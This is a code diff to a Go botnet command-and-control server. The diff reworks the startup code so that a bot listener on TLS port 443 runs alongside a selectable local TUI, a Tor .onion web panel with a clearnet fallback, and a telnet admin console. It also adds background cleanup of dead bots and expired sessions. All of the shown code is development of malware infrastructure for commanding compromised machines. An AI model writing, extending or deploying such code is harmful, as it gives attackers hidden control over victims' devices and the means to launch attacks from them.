@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"net"
+	"net/http"
 	"os"
 	"sync"
 	"time"
@@ -108,24 +109,44 @@ var (
 
 // ============================================================================
 // MAIN ENTRY POINT
-// Initializes the CNC server with two listeners:
-// 1. TLS bot listener on port 443 - accepts encrypted bot connections
-// 2. Plain TCP user listener on configured port - accepts admin CLI logins
+// 3-way C2: TUI (local), Web Panel (Tor .onion), Telnet (remote CLI)
 // Creates default root user if users.json doesn't exist.
 // ============================================================================
 
-// main is the CNC server entry point - starts both bot and user servers
-// Creates root user with random password on first run
-// Loads TLS certificates for secure bot communication
-// Starts background goroutines for dead bot cleanup
-// Bot server runs TLS on 443, user CLI runs plain TCP
 func main() {
-	// Record C2 start time for uptime tracking
 	c2StartTime = time.Now()
 
-	// Check for split mode flag (TUI is default, --split enables telnet)
-	splitMode := len(os.Args) > 1 && os.Args[1] == "--split"
-	tuiMode = !splitMode
+	// Parse CLI flags
+	var runTUI, runWebTor, runSplit bool
+	for _, arg := range os.Args[1:] {
+		switch arg {
+		case "--tui":
+			runTUI = true
+		case "--web":
+			runWebTor = true
+		case "--split":
+			runSplit = true
+		case "--daemon":
+			runWebTor = true
+			runSplit = true
+		}
+	}
+
+	// No flags = show interactive launcher
+	if !runTUI && !runWebTor && !runSplit {
+		choices := RunLauncher()
+		runTUI = choices.TUI
+		runWebTor = choices.WebTor
+		runSplit = choices.Split
+	}
+
+	// Nothing selected = exit
+	if !runTUI && !runWebTor && !runSplit {
+		fmt.Println("[☾℣☽] No mode selected, exiting.")
+		return
+	}
+
+	tuiMode = runTUI && !runSplit && !runWebTor
 
 	// First run: Create default root user with random 12-char password
 	if _, fileError := os.ReadFile(usersFile); fileError != nil {
@@ -160,8 +181,10 @@ func main() {
 	tlsConfig := loadTLSConfig()
 	logMsg("[INFO] TLS configuration loaded successfully")
 
-	// Start dead bot cleanup routine
+	// Start background tasks
 	go cleanupDeadBots()
+	go cleanupExpiredSessions()
+	go sampleStats()
 
 	// Start bot server (TLS ONLY)
 	go func() {
@@ -174,7 +197,6 @@ func main() {
 		defer botListener.Close()
 
 		logMsg("[☾℣☽] Bot TLS server is running on port 443")
-		logMsg("[AUTH] Using magic code authentication: %s", MAGIC_CODE)
 
 		for {
 			conn, err := botListener.Accept()
@@ -182,15 +204,54 @@ func main() {
 				logMsg("Error accepting bot TLS connection: %v", err)
 				continue
 			}
-
-			// Validate TLS and start authentication
 			go validateTLSHandshake(conn)
 		}
 	}()
 
-	// TUI mode: Start local Bubble Tea interface instead of telnet server
-	if tuiMode {
-		time.Sleep(500 * time.Millisecond) // Let bot server start
+	// Start Web Panel over Tor (if selected)
+	if runWebTor {
+		go func() {
+			handler := NewWebMux()
+			if err := StartTorWebServer(handler); err != nil {
+				fmt.Printf("[TOR] Error: %v\n", err)
+				// Fallback: try clearnet on port 8080
+				fmt.Println("[WEB] Falling back to clearnet on :8080")
+				srv := &http.Server{Addr: ":8080", Handler: handler}
+				if err := srv.ListenAndServe(); err != nil {
+					fmt.Printf("[WEB] Clearnet fallback failed: %v\n", err)
+				}
+			}
+		}()
+	}
+
+	// Start Telnet/Split server (if selected)
+	if runSplit {
+		go func() {
+			logMsg("[☾℣☽] Admin CLI server starting on %s:%s", USER_SERVER_IP, USER_SERVER_PORT)
+			userListener, err := net.Listen("tcp", USER_SERVER_IP+":"+USER_SERVER_PORT)
+			if err != nil {
+				fmt.Println("Error starting user server:", err)
+				return
+			}
+			defer userListener.Close()
+
+			go updateTitle()
+
+			for {
+				conn, err := userListener.Accept()
+				if err != nil {
+					logMsg("Error accepting user connection: %v", err)
+					continue
+				}
+				logMsg("[☾℣☽] [User] Connected To Login Port: %s", conn.RemoteAddr())
+				go handleRequest(conn)
+			}
+		}()
+	}
+
+	// Start TUI (if selected) — blocks until exit
+	if runTUI {
+		time.Sleep(500 * time.Millisecond)
 		if err := StartTUI(); err != nil {
 			fmt.Println("Error running TUI:", err)
 			os.Exit(1)
@@ -198,26 +259,6 @@ func main() {
 		return
 	}
 
-	// Start admin CLI server (plain TCP)
-	logMsg("[☾℣☽] Admin CLI server starting on %s:%s", USER_SERVER_IP, USER_SERVER_PORT)
-	userListener, err := net.Listen("tcp", USER_SERVER_IP+":"+USER_SERVER_PORT)
-	if err != nil {
-		fmt.Println("Error starting user server:", err)
-		return
-	}
-	defer userListener.Close()
-
-	go updateTitle()
-
-	// User connection handling
-	for {
-		conn, err := userListener.Accept()
-		if err != nil {
-			logMsg("Error accepting user connection: %v", err)
-			continue
-		}
-		logMsg("[☾℣☽] [User] Connected To Login Port: %s", conn.RemoteAddr())
-
-		go handleRequest(conn)
-	}
+	// No TUI — block forever (web/split run in goroutines)
+	select {}
 }
